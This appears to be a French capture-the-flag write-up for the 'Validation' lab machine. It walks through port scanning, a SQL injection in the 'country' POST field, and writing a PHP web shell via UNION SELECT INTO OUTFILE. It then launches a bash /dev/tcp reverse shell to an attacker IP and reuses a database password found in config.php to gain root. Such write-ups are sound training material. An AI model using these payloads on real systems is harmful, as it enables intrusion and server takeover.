# Validation - Easy

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-12 10:22 EST
Nmap scan report for 10.10.11.116
Host is up (0.067s latency).
Not shown: 992 closed tcp ports (conn-refused)
PORT     STATE    SERVICE       VERSION
22/tcp   open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open     http          Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.48 (Debian)
5000/tcp filtered upnp
5001/tcp filtered commplex-link
5002/tcp filtered rfe
5003/tcp filtered filemaker
5004/tcp filtered avt-profile-1
8080/tcp open     http          nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On lance un gobuster dir sur le site au port 80 pendant qu’on explore.

Pas d’injection SQL sur le champ username à première vue. Le serveur utilise du php et tourne avec du apache. 

Résultats du gobuster:

Il y a un fichier config.php mais il est protégé, on fait un autre gobuster en filtrant pout les fichiers php

```bash
gobuster dir -u http://10.10.11.116 -w /usr/share/wordlists/dirb/big.txt -x php
```

Rien de trouvé, on va tenter sqlmap sur le champ username. On intercepte d’abord la requête avec Burp. Voici les champs:

```bash
username=test&country=Brazil
```

Contrairement à ce que l’on pourrait penser c’est le paramètre country qui est vulnérable:

```bash
sqlmap identified the following injection point(s) with a total of 129 HTTP(s) requests:
---
Parameter: country (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test&country=Brazil' AND (SELECT 3054 FROM (SELECT(SLEEP(5)))DwDZ) AND 'wBZY'='wBZY
---
```

On arrive rien à tirer avec sqlmap donc on essaye en manuel et en rajoutant un simple ‘ au pays on tombe sur:

```bash
:  Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33
Stack trace:
#0 {main}
  thrown in <b>/var/www/html/account.php</b> on line <b>33</b>
```

On va donc maintenant essayer de faire des injections avec le test de l’union classique pour savoir combien de colonnes sont attendues:

```bash
username=test&country=Afganistan' union select 1 -- -
```

1 apparaît dans la liste des users donc c’est une réussite, la query attends 1 colonnes. On se rend compte qu’on peut demander n’importe quoi tant que c’est du SQL:

```bash
username=test&country=Afganistan' union select "test" -- -
```

```bash
username=test&country=Afganistan' union select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php" -- -
```

Résultat:

```bash
Warning: system(): Cannot execute a blank command in /var/www/html/shell.php on line 1
```

On a donc plus qu’à faire ça pour tester:

```bash
http://10.10.11.116/shell.php?cmd=ls
```

On peut donc faire un reverse shell facilement

```bash
http://10.10.11.116/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.6/9090+0>%261'
```

On trouve alors dans le fichier config.php:

```php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

On remarque également qu’on a accès au flag user.

On ne trouve rien sur la DB en se connectant avec mysql et vu le nom du mdp on essaye de se connecter en root:

```php
mysql -u uhc -p
sudo root
```

Il se trouve que c’est un mdp global (comme le nom l’indique) donc on obtient le flag root